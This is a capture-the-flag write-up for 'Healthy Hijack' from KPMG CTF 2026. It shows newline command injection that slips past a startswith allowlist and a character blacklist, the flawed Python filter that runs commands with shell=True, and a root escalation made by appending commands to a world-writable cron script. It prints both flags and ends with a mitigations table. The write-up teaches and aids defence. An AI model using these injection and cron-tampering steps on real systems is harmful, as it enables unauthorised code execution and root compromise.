---
link: 'writeups/kpmg-ctf-2026/healthy-hijack'
title: "Healthy Hijack - KPMG CTF 2026"
description: "Writeup for Healthy Hijack (Parts 1 & 2) from KPMG CTF 2026. Newline injection through a command allowlist bypass, followed by a world-writable root cron script to escalate to root."
date: 2026-10-25 11:52:00
categories:
  - [Writeups, KPMG CTF 2026]
tags:
  - KPMG-CTF-2026
  - Infrastructure
  - Command Injection
  - Privilege Escalation
  - Cron Abuse
---

# KPMG CTF 2026 - Healthy Hijack

---

## Challenge Description

> A "Safe Command Runner" web portal that claims to only allow network debugging commands like `ping`, `traceroute`, and `nslookup`. Get both the user flag and the root flag from the container.

---

## Step 1 - Recon

The app had a `/run` endpoint that took a `cmd` field. Trying `ping 1.1.1.1` hit the binary but failed with a permissions error. Trying `id` directly got rejected outright, so we knew the app was checking the command name. Semicolons were also blocked - `ping -c 1 127.0.0.1; id` just returned the ping error, no `id` output.

![Command bypass using # trick](/img/posts/kpmg-ctf-2026-01_command_bypass.webp)

---

## Step 2 - Reading the Source

We read `/app/app.py` through the injection to understand the filter:

```python
ALLOWED_COMMANDS = ["ping", "traceroute", "nslookup"]

def is_allowed(cmd):
    return any(cmd.startswith(c) for c in ALLOWED_COMMANDS)

def sanitize(user_input):
    blacklist = [";", "&", "|", "`", "$(", "<"]
    for b in blacklist:
        user_input = user_input.replace(b, "")
    return user_input
```

And the execution:

```python
subprocess.run(cmd, shell=True, ...)
```

The allowlist only checked that the input **started with** a valid command. The blacklist stripped common shell operators but completely missed newline characters. Since `shell=True` passes the whole string to `/bin/sh`, a newline separates it into two commands.

---

## Step 3 - Newline Injection to Get the User Flag

The textarea sends `\r\n` line endings. The stray `\r` would get attached to the next command name and break it, so we added `#` at the end of each line to comment it out:

```text
ping -V #
cat /home/appuser/user.txt #
```

We knew where the flag was because `/entrypoint.sh` showed it gets written to `/home/appuser/user.txt` with mode `644` on startup.

![Flag location from entrypoint](/img/posts/kpmg-ctf-2026-02_flag_location_entrypoint.webp)

### Flag 1

```plain
KPMG_CTF{5NGFEr8rYdC-SkS6lM0vQnwHTHq0mKr72f8_WeMZcMIN}
```

![User flag](/img/posts/kpmg-ctf-2026-08_healthy_flag1.webp)

---

## Step 4 - Privilege Escalation to Root

With command injection as `appuser`, we started looking for privesc paths.

### Finding SUID Binaries and Writable Files

```text
ping -V #
find / -perm -4000 -type f 2>/dev/null #
```

![Recon as appuser](/img/posts/kpmg-ctf-2026-03_p2_recon.webp)

`/usr/sbin/exim4` showed up as SUID but its options needed admin privileges, so it was a dead end.

![Finding writable locations](/img/posts/kpmg-ctf-2026-04_p2_find_writable.webp)

### The Cron Config

Checking `/etc/crontab` is where things got interesting:

```cron
* * * * * root /opt/healthcheck.sh
* * * * * root sleep 10 && /opt/healthcheck.sh
* * * * * root sleep 20 && /opt/healthcheck.sh
* * * * * root sleep 30 && /opt/healthcheck.sh
* * * * * root sleep 40 && /opt/healthcheck.sh
* * * * * root sleep 50 && /opt/healthcheck.sh
* * * * * root find /tmp -perm /4000 -delete
```

Root runs the health check script every 10 seconds. We checked the file permissions:

```text
-rwxrwxrwx 1 root root ... /opt/healthcheck.sh
```

World-writable. The `find /tmp -perm /4000 -delete` job was a red herring to distract from SUID abuse - the real path was this script.

![Crontab contents](/img/posts/kpmg-ctf-2026-05_p2_crontab.webp)

### Exploiting It

We appended a flag-copy command to the script:

```text
ping -V #
printf '\n/bin/cp /root/root.txt /tmp/rootflag\n/bin/chmod 644 /tmp/rootflag\n' >> /opt/healthcheck.sh #
```

![Exploiting the cron job](/img/posts/kpmg-ctf-2026-06_p2_exploit_cron.webp)

Waited about 10 seconds for cron to fire, then read it:

```text
ping -V #
cat /tmp/rootflag #
```

![Root flag](/img/posts/kpmg-ctf-2026-07_p2_root_flag.webp)

### Cleanup

```text
ping -V #
printf '#!/bin/sh\n# System healthcheck\necho "OK" > /tmp/health.log\n' > /opt/healthcheck.sh #
rm -f /tmp/rootflag #
```

### Flag 2

```plain
KPMG_CTF{Ymllhoq12FPE13ifQowH_8hOefYuEQMea7bGiq1LOuZE}
```

![Root flag confirmed](/img/posts/kpmg-ctf-2026-09_healthy_flag2.webp)

---

## Mitigations

| Vulnerability | Fix |
|---|---|
| Newline injection bypass | Strip `\n` and `\r` in `sanitize()` |
| `startswith` allowlist check | Validate only the first whitespace-delimited token |
| `shell=True` with user input | Use `subprocess.run([cmd, *args], shell=False)` |
| World-writable root cron script | Set `/opt/healthcheck.sh` to `0755` or `0700` |

---

## Summary

Two bugs chained together. The command filter only checked the start of the input and forgot about newlines, which the shell happily treated as command separators. Once we had code execution as `appuser`, we found a root-owned cron script that was world-writable - we just appended our own command to it and waited for root to run it.
